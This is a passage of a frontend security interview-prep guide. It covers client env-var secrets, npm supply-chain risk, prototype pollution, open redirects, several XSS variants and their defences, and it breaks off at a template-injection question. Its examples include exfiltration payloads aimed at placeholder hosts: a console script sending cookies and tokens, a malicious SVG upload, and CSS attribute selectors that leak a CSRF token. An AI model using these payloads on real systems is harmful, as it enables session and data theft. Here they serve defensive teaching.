Env vars in a frontend build are not secret. import.meta.env.VITE_X / process.env.REACT_APP_X are string-replaced into the output at build time, so they land in the JS that ships to every user. "Environment variable" implies secrecy on a server; on a client it just means "baked into the bundle."

What is safe vs unsafe in the frontend

  • Safe (public by design): a public API base URL, a Firebase web config, a publishable Stripe key (pk_...), an analytics site ID, an OAuth client_id. These are meant to be public and are protected by other controls (domain allow-lists, backend validation).
  • Unsafe (never ship): secret/private API keys, Stripe secret key (sk_...), database URLs, JWT signing secrets, cloud credentials, any token that grants privileged access.

Patterns that keep secrets server-side

Use a Backend-for-Frontend or serverless proxy: the browser calls /api/quote, and the server attaches the third-party secret key and forwards the request. Restrict public keys by allowed HTTP referrer/origin and scope where the provider supports it. And disable or protect source maps in production so you don't hand attackers your unminified code and comments.

Code Example

// WRONG: a real secret in a client env var — it ends up in the bundle verbatim.
const key = import.meta.env.VITE_STRIPE_SECRET_KEY; // sk_live_... now PUBLIC
fetch("https://api.stripe.com/v1/charges", {
  headers: { Authorization: `Bearer ${key}` },       // anyone can read this
});

// RIGHT: frontend calls YOUR server; the secret stays on the server.
// client:
await fetch("/api/charge", { method: "POST", body: JSON.stringify({ amount }) });

// server (secret only lives here, from a server-side env var / secret manager):
app.post("/api/charge", async (req, res) => {
  const key = process.env.STRIPE_SECRET_KEY; // never sent to the browser
  // ... call Stripe with key, return only what the client needs
});

Project Example

A team put a third-party mapping provider's secret key in REACT_APP_MAPS_SECRET to "make the map work." It shipped in the bundle; within weeks an automated scanner harvested it and ran up a five-figure API bill. Remediation: rotate the key immediately, move all map-tile requests through a small server proxy that held the secret, and add a pre-commit/CI secret scanner (gitleaks) to catch the pattern before merge. The publishable-only key stayed on the client with a referrer restriction.

Senior Engineer Perspective

The senior mental model: "if the browser can use it, the world can read it." Interviewers may push with "but I put it in .env, isn't that private?" — the answer is no for client builds; .env keeps it out of git, not out of the shipped bundle. Strong extras: (1) run secret scanning in CI and git history (a leaked key in old commits is still leaked); (2) rotate any key the moment it touches the client; (3) prefer providers that offer restricted publishable keys; (4) turn off production source maps or upload them only to your error tracker privately. Distinguishing "public-by-design key" from "true secret" cleanly is the mark of someone who has actually shipped.

Q14. What are supply-chain risks in npm, and how do lockfiles and npm audit help?

ROI: ★★★★★ Frequency: High

Short Answer

A modern frontend pulls in hundreds of transitive npm packages, any of which runs with full access to your build and (once bundled) your users' browsers. Supply-chain risk is that one of those dependencies is malicious or compromised — via a hijacked maintainer account, typosquatting, or a poisoned update. Defenses: commit a lockfile for reproducible, pinned installs; run npm audit / Dependabot to surface known-vulnerable versions; use npm ci in CI; and minimize/review dependencies.

Detailed Answer

How the attacks happen

  • Typosquatting: a package named reakt-dom or crossenv that mimics a popular one and steals env vars on install.
  • Maintainer compromise / malicious update: a trusted package (e.g. the historical event-stream incident) ships a new version containing malware.
  • Install scripts: postinstall hooks run arbitrary code on npm install, before your app ever runs.
  • Dependency confusion: publishing a public package with the same name as your private internal one so the resolver grabs the attacker's.

What the lockfile does

package-lock.json / yarn.lock / pnpm-lock.yaml pins the exact version and integrity hash of every package in the tree. Committing it means every teammate and CI installs byte-for-byte the same dependencies, and the integrity hash detects tampering. Use npm ci (not npm install) in CI — it installs strictly from the lockfile and fails if package.json and the lock disagree.

Auditing and reducing exposure

npm audit cross-references your tree against known CVEs; Dependabot/Renovate automate update PRs. Reduce the attack surface: prefer fewer, well-maintained deps; scrutinize new dependencies (downloads, mainteners, recent activity); consider --ignore-scripts for untrusted installs; and pin/verify with tools like Socket or Snyk that detect suspicious behavior, not just known CVEs.

Code Example

# Reproducible, lockfile-strict install in CI (fails if lock is out of sync):
npm ci

# Surface known vulnerabilities; fail the build on high severity:
npm audit --audit-level=high

# Block install scripts for an untrusted one-off install:
npm install some-pkg --ignore-scripts

# package-lock.json pins exact version + integrity hash per package:
# "lodash": {
#   "version": "4.17.21",
#   "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
#   "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvA=="
# }

Project Example

An automated Dependabot alert flagged a transitive dependency with a prototype-pollution CVE that we'd never installed directly. Because we committed the lockfile and ran npm ci, we knew the exact version in every environment and could confirm the fix landed uniformly after bumping. Separately, a CI npm audit --audit-level=high gate once caught a compromised minor release before it reached production — the pipeline failed and we pinned to the last known-good version.

Senior Engineer Perspective

Interviewers want practices, not just tools. Strong senior points: (1) always commit the lockfile and use npm ci for deterministic builds; (2) npm audit is necessary but noisy — many "vulnerabilities" aren't reachable in a frontend context, so triage by exploitability rather than blindly upgrading. (3) The scariest vectors are postinstall scripts and dependency confusion, which run before your code and often exfiltrate CI secrets — mitigate with scoped registries, `.npmrc` scope config, and least-privilege CI tokens. (4) Consider generating an SBOM and using behavior-based scanners (Socket) that catch malicious new packages that have no CVE yet. Naming dependency confusion and install-script risk specifically signals real supply-chain awareness.

Q15. What is prototype pollution and how does it reach the frontend?

ROI: ★★★ Frequency: Medium

Short Answer

Prototype pollution is a JavaScript-specific vulnerability where an attacker injects properties into Object.prototype (usually via a crafted key like __proto__ or constructor.prototype). Because almost every object inherits from Object.prototype, a polluted prototype changes the behavior of the whole app — it can inject default values, bypass checks, cause denial of service, or, when the polluted property later flows into a sink, escalate to XSS or worse. It typically enters through unsafe recursive merge/clone/set functions or parsing attacker-controlled JSON/query strings into objects.

Detailed Answer

How it works

If code deep-merges attacker-controlled data into an object without guarding special keys, a payload like {"__proto__": {"isAdmin": true}} writes isAdmin onto Object.prototype. Now every object in the app appears to have isAdmin === true unless it explicitly overrides it. On the frontend the impact ranges from logic bypasses to full XSS when a polluted property is later used as an HTML template option, a config flag that enables a dangerous sink, or a gadget in a library.

Common entry points

  • Vulnerable versions of deep-merge/clone utilities (historical CVEs in lodash.merge, minimist, jquery.extend).
  • Parsing query strings or JSON into a nested object structure without sanitizing keys.
  • Your own recursive setByPath(obj, "a.b.c", value) helpers.

Defenses

  • Block dangerous keys (__proto__, constructor, prototype) when merging/setting from untrusted data.
  • Use Object.create(null) for dictionaries so there's no prototype to pollute, or use a Map instead of a plain object.
  • Freeze the prototype: Object.freeze(Object.prototype) (with care).
  • Keep dependencies patched — most real-world cases are a known CVE in a merge library.

Code Example

// VULNERABLE recursive merge — no key guard.
function merge(target, src) {
  for (const key in src) {
    if (typeof src[key] === "object" && src[key]) {
      target[key] = target[key] || {};
      merge(target[key], src[key]);   // walks into __proto__ if present
    } else {
      target[key] = src[key];
    }
  }
  return target;
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log(({}).isAdmin); // true  <-- every object is now "admin"

// SAFE: reject dangerous keys, or use a null-prototype dictionary.
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);
function safeSet(obj, key, val) {
  if (BLOCKED.has(key)) return;   // ignore pollution attempts
  obj[key] = val;
}
const dict = Object.create(null); // no prototype to pollute

Project Example

A form builder merged user-submitted JSON config into a defaults object using an old lodash.merge. A researcher submitted a __proto__ payload that flipped a global "allowRawHtml" default to true, which in turn caused another component to render fields via innerHTML — chaining prototype pollution into XSS. The fix was upgrading lodash to the patched version and switching the defaults container to Object.create(null) so there was no prototype to write to.

Senior Engineer Perspective

The senior insight is that prototype pollution is rarely the final impact — it's a primitive that becomes dangerous when a polluted property reaches a gadget (a code path that reads that property and does something dangerous, like enabling an HTML sink or a template option). So severity depends on the gadgets present in your app and dependencies. Practical guidance: it's overwhelmingly a dependency-hygiene problem (patch known-CVE merge libs), reinforced by null-prototype dictionaries for untrusted maps and key allow-listing at parse boundaries. Mentioning the pollution→gadget→XSS chain shows you understand it as an exploitation stepping-stone, not an isolated bug.

Q16. What are open redirects and how do you sandbox untrusted iframes?

ROI: ★★★ Frequency: Medium

Short Answer

An open redirect is an endpoint or client route that sends the user to a URL taken from untrusted input (e.g. ?next=) without validating it, letting an attacker craft a link on your trusted domain that bounces the victim to a phishing site — or, with a javascript: target, executes script. Fix it by validating redirect targets against an allow-list of internal paths, never redirecting to raw external input. For embedding untrusted content, the sandbox attribute on <iframe> strips the frame's privileges by default (no scripts, no forms, no top-navigation) and you re-grant only what's needed via explicit tokens.

Detailed Answer

Open redirect

Redirects driven by user input are dangerous because the phishing link genuinely originates from your domain (https://trusted.com/login?next=https://evil.com), which lends it credibility and can defeat naive URL filters. In OAuth flows an open redirect can even be chained to steal tokens. Defenses: only allow relative internal paths, reject anything starting with // or containing a scheme, and prefer an allow-list or a mapping of opaque keys to known destinations. On the client, never do location.href = params.get("next") without validation.

iframe sandboxing

When you must embed third-party or user-generated content (ads, previews, code playgrounds, untrusted HTML), render it in a sandboxed iframe. A bare sandbox attribute applies the maximum restrictions; you then opt back in only what's required:

  • allow-scripts: permit JS (but grant this without allow-same-origin so the frame is treated as a unique opaque origin and can't touch your cookies/DOM).
  • allow-same-origin: keep the frame's origin — never combine with allow-scripts for untrusted content, since together they can remove their own sandbox.
  • allow-forms, allow-popups, allow-top-navigation: grant sparingly.

Pair sandboxing with CSP frame-src to control what can be framed, and serve untrusted user content from a separate origin/domain so the Same-Origin Policy isolates it from your app.

Code Example

// OPEN REDIRECT — do not do this:
const next = new URLSearchParams(location.search).get("next");
location.href = next; // "?next=https://evil.com" or "javascript:..." => attack

// SAFE: allow only internal, relative paths.
function safeNext(next) {
  if (typeof next !== "string") return "/";
  if (!next.startsWith("/") || next.startsWith("//")) return "/"; // block absolute/protocol-relative
  return next;
}
location.href = safeNext(next);

// SANDBOXED iframe for untrusted content: scripts allowed, but treated as a
// foreign origin so it cannot read your cookies/DOM. NOTE: no allow-same-origin.
<iframe
  src="https://usercontent.example.net/preview"
  sandbox="allow-scripts"
  csp="default-src 'none'">
</iframe>

Project Example

A login page redirected to ?returnUrl= after auth without validation. Attackers spread https://ourapp.com/login?returnUrl=https://ourapp-security.evil.com links that looked legitimate and harvested credentials post-login. We restricted returnUrl to a relative-path allow-list. Separately, our in-app HTML email previewer originally used a same-origin iframe; moving it to a sandboxed iframe (allow-scripts only) on a dedicated content domain meant a malicious email could no longer read the app session even if it ran script.

Senior Engineer Perspective

On open redirects, the senior nuance is why they matter beyond "user goes to a bad site": they lend attacker links your domain's trust, bypass link scanners, and are a classic OAuth token-theft vector via the redirect_uri — which is why OAuth mandates exact-match registered redirect URIs. On iframes, the killer detail interviewers look for is that sandbox="allow-scripts allow-same-origin" together is effectively no sandbox — the framed content can script its way out — so untrusted embeds get scripts or same-origin, never both, and ideally live on a separate origin so SOP does the isolating regardless.

SECTION 5 - XSS DEEP DIVE

Q17. What is self-XSS, and why do "paste this in your console" scams actually work?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Self-XSS is not a code vulnerability at all — it's social engineering that tricks the victim into running the attacker's malicious JavaScript themselves, usually by pasting it into DevTools console while believing it unlocks a "free item," "hack," or "verification tool." Because the script runs in the victim's own authenticated session, it can read cookies/localStorage and make requests exactly as if a real XSS had fired — the difference is the attacker needed zero application bug, only persuasion.

Detailed Answer

Why it is so effective

Scammers piggyback on legitimate-sounding contexts: fake customer-support scripts ("paste this to verify your account"), game "cheat codes," or social-media "see who viewed your profile" scripts. The victim already trusts the tab they're in, and DevTools looks technical enough to feel authoritative. Because there's no injection bug, WAFs, CSP, and output-encoding are all irrelevant — the payload never had to sneak past anything.

Browser-level mitigation

Chrome and Firefox both print a large console warning ("Don't paste code you don't understand...") the first time DevTools is opened, specifically to blunt this attack class. It's a UX nudge, not a technical control — a determined victim can still paste.

What frontend teams can actually do

You can't patch human trust with code, but you can reduce the blast radius: keep tokens out of easily-copyable global state (window.__TOKEN__ is a gift to a pasted script), scope powerful actions behind re-authentication (step-up auth for destructive actions), and educate support/community teams never to ask users to open DevTools.

Code Example

// A "free followers" self-XSS payload a scammer asks the victim to paste:
fetch("https://attacker.example/collect", {
  method: "POST",
  body: JSON.stringify({
    cookies: document.cookie,               // readable if not httpOnly
    token: localStorage.getItem("authToken") // readable regardless
  })
});
// Nothing "broke in" -- the victim's own browser, in their own session, sent this.

// Reducing the target: don't expose tokens as easily-grabbed globals.
// BAD:
window.__APP_TOKEN__ = accessToken;         // trivial one-liner to exfiltrate
// BETTER: keep it in a closure/module scope, never on `window`.

Project Example

A gaming platform saw a wave of account takeovers traced not to a bug but to a viral "free skins" video instructing viewers to paste a script into console. The script read a token the app had (for debugging convenience) attached to window.appState.token. Removing that debug global and adding step-up re-auth before any inventory-transfer action neutralized the campaign even though the social-engineering vector itself couldn't be "patched."

Senior Engineer Perspective

Interviewers use this question to see if you understand that not every account-takeover implies an app vulnerability — sometimes the fix is architectural hardening (never expose secrets as globals, require step-up auth for sensitive actions) rather than a traditional patch. A sharp answer distinguishes self-XSS from real XSS clearly and still proposes concrete mitigations instead of shrugging it off as "not our bug."

Q18. What is mutation XSS (mXSS), and why can a sanitizer be bypassed by the browser's own HTML parser?

ROI: ★★★★ Frequency: Medium

Short Answer

Mutation XSS is a class of bypass where a sanitizer inspects a string and deems it safe, but when the browser's own HTML parser later re-parses or "mutates" that string (e.g. round-tripping it through innerHTML, or the sanitizer itself parsing then re-serializing the DOM), quirky parsing rules transform the markup into something dangerous. The sanitizer sanitized one representation of the string; the browser executes a different one produced by its own normalization.

Detailed Answer

A classic pattern

A payload nested inside a <noscript>, <template>, or malformed tag can look inert to a naive sanitizer, but once assigned to innerHTML the browser's parser "fixes up" the malformed structure into an active element — for example content inside a <style> or SVG namespace context that gets reinterpreted when re-serialized. The sanitizer sanitized the pre-mutation tree; the browser executed the post-mutation tree.

Why this keeps happening

HTML parsing has decades of legacy quirks (error-recovery rules, namespace switching between HTML/SVG/MathML, adoption-agent algorithm edge cases) that are astonishingly hard to model correctly outside a real browser engine. A sanitizer using a different/simplified parser than the target browser will disagree with it on some inputs — and that gap is exactly where mXSS lives.

Defenses

  • Use a sanitizer (DOMPurify) that is actively maintained against mXSS research and tests itself by round-tripping through a real DOM, not a regex or custom parser.
  • Sanitize after the final DOM insertion context is known, and avoid re-serializing sanitized output back into an HTML string that gets parsed again elsewhere.
  • Prefer Trusted Types so the browser itself refuses to feed unvetted strings into innerHTML at all, closing off the mutation window.

Code Example

// Conceptual mXSS shape: looks inert to a naive checker...
const looksInert = "<svg><style><img src=x onerror=alert(1)></style></svg>";

// ...but once assigned to innerHTML, the browser's own SVG/style parsing
// rules can re-interpret the fragment into a live, executing <img onerror>.
el.innerHTML = looksInert; // mutation happens here, inside the browser's parser

// Defense: don't hand-roll a parser. Use a sanitizer whose test suite is
// built around real mXSS research (DOMPurify), and re-check the OUTPUT
// after it has been through the browser's own DOM, not before.
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(untrusted); // designed specifically to defeat mXSS
el.innerHTML = clean;

Project Example

A team had shipped a homegrown regex-based "strip dangerous tags" sanitizer for user bios years earlier. A researcher demonstrated an mXSS payload using nested <svg>/<style> markup that the regex approved but that re-parsed into an executing onerror handler once rendered. Swapping the homegrown sanitizer for DOMPurify (which specifically tests against published mXSS vectors) closed the class of bug rather than just the one reported case.

Senior Engineer Perspective

The senior signal here is recognizing mXSS as the reason "we sanitize, so we're safe" is not automatically true — the sanitizer and the ultimate consumer (the browser's parser) must agree on what a string means, and only a battle-tested library invests in staying in sync with browser parsing quirks. This is also a strong argument for Trusted Types: it moves the guarantee from "we sanitized correctly" to "the browser structurally refuses unvetted strings," removing an entire category of these subtle disagreements.

Q19. What is the Trusted Types API, and how does it eliminate DOM XSS at the browser level?

ROI: ★★★★ Frequency: Medium

Short Answer

Trusted Types is a browser/CSP feature (require-trusted-types-for 'script') that makes dangerous DOM sinks — innerHTML, outerHTML, document.write, eval-adjacent APIs, script src — refuse plain strings. Instead they only accept a special TrustedHTML/TrustedScript/TrustedScriptURL object produced by a registered, code-reviewed policy. This turns "someone forgot to sanitize before an innerHTML assignment" from a silent runtime vulnerability into an immediate thrown TypeError, catchable in CI/testing and in production error reporting.

Detailed Answer

How it changes the attack surface

Without Trusted Types, any line of code anywhere in your app (or a dependency) that does el.innerHTML = untrusted is a potential DOM-XSS sink. With Trusted Types enforced, that same line throws unless untrusted was produced by an explicitly registered policy — meaning the set of places that can create dangerous HTML strings shrinks to a small, auditable list instead of "everywhere."

Defining a policy

A policy is a small object with functions like createHTML; you typically wire it to call DOMPurify internally, so the policy is your sanitization boundary, centrally enforced rather than hoped-for at every call site.

Rollout strategy

Ship Content-Security-Policy-Report-Only: require-trusted-types-for 'script' first to find violations without breaking production, fix flagged call sites (route them through your policy or a safe API), then enforce. Browsers without Trusted Types support simply ignore the directive (graceful degradation), so it's safe to ship even without universal support.

Code Example

// CSP header enabling Trusted Types and naming allowed policies:
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types default dompurify;

// Register a policy once, early in app bootstrap:
if (window.trustedTypes && trustedTypes.createPolicy) {
  trustedTypes.createPolicy("dompurify", {
    createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true }),
  });
}

// Without a policy, this now THROWS instead of silently executing an XSS payload:
el.innerHTML = userSuppliedHtml; // TypeError: This document requires 'TrustedHTML'

// With the policy, explicitly mark the value as trusted after sanitizing:
const policy = trustedTypes.getPolicy("dompurify");
el.innerHTML = policy.createHTML(userSuppliedHtml); // allowed, already sanitized

Project Example

A large dashboard app had dozens of legacy innerHTML call sites accumulated over years, with no consistent sanitization discipline. Rolling out Trusted Types in report-only mode surfaced every one of them as a CSP violation report in a week, which the team triaged and routed through a single DOMPurify-backed policy. Enforcing it afterward meant any future unsanitized innerHTML addition — from a new hire or a careless dependency — fails loudly in CI/staging instead of shipping silently.

Senior Engineer Perspective

The senior framing: sanitization discipline enforced by code review doesn't scale — people forget, dependencies change, and a single miss anywhere is a live vulnerability. Trusted Types converts a process guarantee into a platform guarantee. Mention browser support caveats (historically strongest in Chromium; other engines lagged, improving over time) and that it composes with CSP's other directives rather than replacing them — it's the capstone of an XSS-mitigation stack, not a standalone fix.

Q20. How can file uploads (especially SVG) become an XSS vector, and how do you handle them safely?

ROI: ★★★★ Frequency: Medium

Short Answer

SVG is XML, and XML can contain <script> tags and event-handler attributes (onload) just like HTML. If your app lets users upload SVGs (avatars, logos) and later serves them from your own origin or renders them inline/in an <img> with certain browser behaviors, the embedded script can execute in your origin's context — turning an "image upload" feature into stored XSS. The fix is to sanitize SVGs like any other untrusted HTML, or better, serve user-uploaded files from a separate, cookie-less origin.

Detailed Answer

Why SVG is different from a PNG/JPEG

Raster formats are pixel data with no executable surface. SVG is markup — it can embed <script>, <foreignObject> with HTML, and event attributes. Whether it executes depends on how it's rendered: a plain <img src="x.svg"> is generally safe (scripts don't run in "image" context in most browsers), but serving it directly (navigating to it, or via object/iframe/inline SVG injection) can execute embedded script.

The origin problem

Even a "safe" rendering context becomes dangerous if the SVG is served from your main origin, because a script that does execute (e.g. if a user opens the uploaded file's URL directly) runs with access to that origin's cookies and DOM. The single most effective mitigation is serving user-generated content from a separate origin/subdomain that holds no session cookies, so even a successful script execution has nothing valuable to steal.

Concrete controls

  • Sanitize SVGs server-side (strip <script>, event handlers, external references) before storing — DOMPurify supports an SVG profile.
  • Set Content-Type correctly and add Content-Disposition: attachment or serve from a sandboxed, cookie-less domain.
  • Re-encode raster uploads (re-compress/re-encode via an image library) to strip any embedded polyglot payload rather than trusting the extension/MIME type.
  • Validate the actual file signature/magic bytes, not just the extension a client claims.

Code Example

// A malicious "avatar.svg" upload:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('/api/export-data').then(r=>r.json()).then(d=>
    fetch('https://evil.example/collect', {method:'POST', body: JSON.stringify(d)}))
  </script>
</svg>

// Server-side sanitization before storage (Node, DOMPurify's SVG profile):
import DOMPurify from "dompurify";
const cleanSvg = DOMPurify.sanitize(rawSvgString, { USE_PROFILES: { svg: true, svgFilters: true } });

// Serve uploads from a cookie-less asset origin, never the app origin:
// https://usercontent-cdn.example.net/avatars/abc123.svg   (no session cookie ever sent here)

// And force download rather than inline execution for untrusted file types:
res.setHeader("Content-Disposition", "attachment; filename=\"avatar.svg\"");
res.setHeader("X-Content-Type-Options", "nosniff");

Project Example

A community platform allowed SVG avatars rendered inline for crisp scaling. A user uploaded an SVG with an embedded script that exfiltrated the viewer's session token whenever a profile page loaded. The remediation moved avatar storage to a dedicated usercontent subdomain with no cookies, added server-side SVG sanitization on upload, and switched rendering to a plain <img> tag (never inline-injected markup) as a second layer.

Senior Engineer Perspective

Interviewers are checking whether "file upload" registers as an XSS surface at all, since it's easy to mentally file it under "just storage." The senior answer stacks defenses: validate real file type by content (not extension/MIME header, which are trivially spoofed), sanitize markup-capable formats, and — most durably — isolate user content on a separate, cookie-less origin so that even a successful bypass has no session to steal. That last point (origin isolation) is the one that survives when a sanitizer inevitably has a gap.

Q21. What XSS risks does a contentEditable rich-text editor introduce, and how do you build one safely?

ROI: ★★★ Frequency: Medium

Short Answer

A contentEditable region lets the browser generate arbitrary HTML as the user types, pastes, and formats — and browsers are inconsistent and occasionally bizarre about exactly what markup they produce (stray <style>, event-attribute-bearing pastes from other sites, malformed nesting). If you persist and later re-render that HTML for other users without sanitizing, you've built a stored-XSS pipeline where the "attacker" might just be a user pasting rich content from a compromised or malicious source page. Treat anything that comes out of a contentEditable exactly like any other untrusted HTML: sanitize before storing and before rendering.

Detailed Answer

Paste is the biggest risk

Pasting from a webpage carries that page's HTML, including whatever event handlers or scripts it contained (browsers strip the most obviously dangerous bits on paste, but this is inconsistent across browsers and not a security boundary). A user innocently copying formatted text from a compromised site can carry a payload into your editor without realizing it.

Serialization and storage

Most editors serialize the DOM to an HTML string (or a structured JSON schema) for storage. If you store raw innerHTML, you must sanitize on write. Many production-grade editors (Slate, ProseMirror, Lexical) instead use a structured document model and only ever render through their own controlled serializer, which is inherently safer than free-form HTML because the editor never round-trips arbitrary markup — it only ever knows about "bold," "link," "list," not raw tags.

Defense checklist

  • Prefer a structured/schema-based editor (ProseMirror/Slate/Lexical) over raw contentEditable + manual HTML handling.
  • Sanitize on save (server) and again on render (client) with a strict allow-list.
  • Intercept paste events and strip to an allow-listed subset rather than trusting the clipboard's HTML wholesale.
  • Never let editor output flow into dangerouslySetInnerHTML unsanitized "because it came from our own editor" — the editor's HTML is still user-influenced.

Code Example

// Naive paste handling -- trusts the clipboard's HTML verbatim (risky):
function onPaste(e) {
  const html = e.clipboardData.getData("text/html");
  document.execCommand("insertHTML", false, html); // whatever markup came along, goes in
}

// Safer: sanitize clipboard HTML to an allow-list before insertion.
import DOMPurify from "dompurify";
function onPasteSafe(e) {
  e.preventDefault();
  const raw = e.clipboardData.getData("text/html") || e.clipboardData.getData("text/plain");
  const clean = DOMPurify.sanitize(raw, { ALLOWED_TAGS: ["b","i","em","strong","a","p","br"] });
  document.execCommand("insertHTML", false, clean);
}

// And ALWAYS sanitize again before storing/rendering editor output,
// regardless of what produced it:
const toStore = DOMPurify.sanitize(editor.getHTML());

Project Example

A knowledge-base tool let employees write articles in a homegrown contentEditable editor, storing raw innerHTML directly. A pasted snippet from an untrusted external site carried an onmouseover handler that survived storage and executed for every reader who hovered the text. Migrating to ProseMirror (schema-based, so arbitrary attributes/tags can't survive the document model) plus DOMPurify on save closed both the immediate bug and the entire class of "whatever the clipboard handed us" risk.

Senior Engineer Perspective

The trap: teams treat their own rich-text editor's output as "trusted" because it's "our" component, forgetting the actual content inside it is fully user-controlled. A senior candidate calls out paste as the sneaky ingestion point (most XSS-in-editor incidents come from paste, not typing) and prefers a schema-constrained editor architecture over raw HTML round-tripping, since it structurally limits what can ever be represented, independent of any sanitizer being remembered or misconfigured.

Q22. Can CSS alone be used to exfiltrate data or attack a page, without any JavaScript?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Yes. CSS can trigger network requests (via background: url(...), @import, attribute selectors) and can be made conditional on page state, which is enough to leak data one bit/character at a time without a single line of JavaScript. Classic examples: CSS attribute-selector exfiltration (matching input values character-by-character to fire different background-image requests) and CSS keylogging via :focus/sibling selectors targeting password fields. This matters because CSP's script-src alone does not stop it — you need style-src control too.

Detailed Answer

Attribute-selector exfiltration

If an attacker can inject CSS (via a CSS-injection bug, an unsanitized style prop, or a theme/customization feature that accepts raw CSS), they can write a rule like input[name="csrf"][value^="a"] { background: url(https://evil/a) } for every possible leading character, and the browser fires the matching request — leaking a hidden token's value character by character purely through selector matching.

CSS keylogging

A rule targeting input[type=password]:focus combined with sibling/animation tricks has been used in research to infer typed characters without any script, exploiting how certain input/animation events can be observed via CSS side effects.

Where this sneaks in

User-customizable themes, "custom CSS" fields in CMS/profile settings, or SVG/CSS uploaded content are the usual entry points. Treat "we only allow CSS, not JS" as a weaker restriction than it sounds — it's safer than allowing script, but not risk-free.

Defenses

  • If you must allow user CSS, run it through a CSS sanitizer/allow-list (restrict to a safe property subset, disallow url()/@import to arbitrary hosts, disallow attribute selectors on sensitive fields).
  • Set a strict style-src and img-src/connect-src in CSP so exfiltration requests to attacker domains are blocked even if a CSS rule tries.
  • Never render sensitive values (tokens, secrets) as DOM attributes that a co-located untrusted stylesheet could select against.

Code Example

// Attacker-injected CSS that exfiltrates a hidden CSRF token value
// character-by-character purely via the attribute selector + a request:
input[name="csrf_token"][value^="a"] { background: url(https://evil.example/leak?c=a); }
input[name="csrf_token"][value^="b"] { background: url(https://evil.example/leak?c=b); }
/* ... one rule per candidate character; whichever matches fires a request */

// Defense 1: CSP restricts where CSS-triggered requests may go.
Content-Security-Policy: style-src 'self'; img-src 'self'; connect-src 'self'

// Defense 2: never expose sensitive values as attributes selectable by
// co-located untrusted styles -- keep them out of the DOM/attribute surface
// (e.g. don't render a raw token into a visible input's `value` attribute
// on a page that also renders user-controlled CSS).

Project Example

A theming feature let power users submit custom CSS for their public profile page. A researcher demonstrated that attribute-selector rules could exfiltrate a same-page CSRF token by iterating character guesses against the token input's value attribute, using distinct background-image URLs to leak each guess. The team added a CSS sanitizer (rejecting attribute selectors and url() to non-allow-listed hosts) and moved the CSRF token out of a plain DOM attribute into a non-selectable transport (header-only, never rendered as a value attribute on the customizable page).

Senior Engineer Perspective

This question filters for people who think of XSS/CSP purely in terms of script-src. A strong answer explains that CSS is a full side-channel: it can make network requests and react to DOM state, which is sufficient for exfiltration even with scripts fully blocked. Mention that this is exactly why CSP has a separate style-src directive and why "user-submitted CSS" should be treated with nearly the same suspicion as "user-submitted HTML," not waved through because it "can't run JavaScript."

Q23. How can server-side rendering and state hydration accidentally introduce XSS?

ROI: ★★★★ Frequency: Medium

Short Answer

SSR frameworks typically serialize initial data into the HTML as an inline script (e.g. <script>window.__DATA__ = {json}</script>) so the client can hydrate without a second fetch. If that JSON is built with naive string concatenation and the data contains a </script> sequence (or other HTML-significant characters) coming from user content, the browser's HTML parser can end the script tag early and start executing whatever follows as markup/script — a classic "JSON-in-HTML" XSS, entirely independent of React's normal JSX escaping.

Detailed Answer

Why JSON.stringify alone isn't enough

JSON.stringify guarantees valid JSON, not valid-as-embedded-in-HTML output. A user-supplied string containing the literal characters </script> survives JSON stringification fine but, once dropped into an HTML document inside a real <script> element, is interpreted by the HTML parser (which runs before the JS parser) as the end of that script tag — anything after it is now raw HTML/script controlled by the attacker's data.

The fix: escape for the HTML context, not just JSON

Escape the handful of characters that are dangerous inside an inline <script> element — most commonly replacing < with its Unicode escape so </script> can never appear literally. Most modern SSR frameworks (Next.js et al.) handle this for their own internal data serialization, but any custom inline-script data injection you write yourself needs the same care.

Hydration mismatches as a secondary concern

Separately, if server-rendered HTML and client-rendered HTML disagree (e.g. because of dangerouslySetInnerHTML content that differs between environments), React's hydration can produce unexpected DOM states. This is primarily a correctness bug, but it's worth knowing it compounds with any existing sanitization gaps.

Code Example

// DANGEROUS: naive serialization into an inline script.
// If `initialData.bio` contains "</script><script>steal()</script>",
// the HTML parser closes the tag early and the attacker's script executes.
const html = `<script>window.__DATA__ = ${JSON.stringify(initialData)}</script>`;

// SAFE: escape the handful of characters that are dangerous inside <script>.
function serializeForScript(data) {
  return JSON.stringify(data)
    .replace(/</g, "\\u003C")   // neutralizes </script>, <!--, etc.
    .replace(/>/g, "\\u003E")
    .replace(/&/g, "\\u0026");
}
const safeHtml = `<script>window.__DATA__ = ${serializeForScript(initialData)}</script>`;

// Even safer: don't inline raw JSON into a script at all -- use a
// <script type="application/json"> data island and JSON.parse it client-side;
// data islands are never executed, only parsed as text.
// <script id="data" type="application/json">{escapedJson}</script>
// const data = JSON.parse(document.getElementById("data").textContent);

Project Example

An SSR product page inlined window.__PRODUCT__ = {JSON.stringify(product)} to avoid a second client fetch. A seller's product description containing </script><img src=x onerror=...> broke out of the intended script tag and executed for every visitor of that listing — a stored XSS with no dangerouslySetInnerHTML anywhere in sight. Switching the escaping to replace </>/& with Unicode escapes (and later migrating to a JSON <script type="application/json"> data island) eliminated the class of bug.

Senior Engineer Perspective

This is a favorite "gotcha" for senior React/SSR interviews because it shows XSS can exist with zero JSX interpolation and zero dangerouslySetInnerHTML — the vulnerability is purely in how you hand-serialize state into the initial HTML payload. The senior answer names the exact mechanism (HTML parser sees </script> before the JS engine ever runs) and prefers a JSON data-island pattern over inline executable-script injection whenever possible, since data islands are parsed as inert text, not as script content, removing the sink entirely.

Q24. What is client-side template injection, and how do sandboxed template/expression engines fail?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Client-side template injection happens when untrusted input is compiled/evaluated as a template expression rather than treated as plain data — e.g. feeding a user string into a templating engine's expression syntax ({{ }}-style bindings) so the attacker's input runs as code inside the engine's expression language, potentially escaping any "sandbox" the engine claims to provide. Historically this was demonstrated against AngularJS's expression sandbox (repeatedly bypassed via prototype/constructor-chain tricks) — a cautionary tale that user-controlled input should never become a template string to compile, only a value substituted into an already-compiled template.

Detailed Answer

